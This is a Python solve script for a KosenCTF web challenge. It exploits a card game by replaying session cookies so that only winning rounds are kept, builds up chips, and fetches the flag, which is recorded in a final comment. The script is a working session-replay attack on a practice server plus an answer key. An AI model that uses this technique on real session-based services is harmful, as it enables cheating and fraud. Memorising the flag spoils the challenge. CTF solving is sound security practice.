import requests


BASE_URL = 'http://web.kosenctf.com:14001/'


def solve():
    res = requests.post(BASE_URL + 'initialize')

    state = res.json()
    now = res.cookies
    while state['chip'] < 999999:
        print('[+] Chip: {}'.format(state['chip']))
        hit0 = requests.post(BASE_URL + 'hit', cookies=now)
        hit1 = requests.post(BASE_URL + 'hit', cookies=hit0.cookies)
        stand = requests.post(BASE_URL + 'stand', cookies=hit1.cookies)
        try:
            candidate_state = stand.json()
        except Exception:
            continue
            # import pdb; pdb.set_trace()

        if candidate_state['chip'] > state['chip']:
            next_game = requests.post(BASE_URL + 'nextgame', cookies=stand.cookies)
            state = next_game.json()
            now = next_game.cookies
    flag_res = requests.get(BASE_URL + 'flag', cookies=now)
    print(flag_res.json())


if __name__ == '__main__':
    solve()

# {'flag': 'KosenCTF{r3m3mb3r_m475u5him4}'}
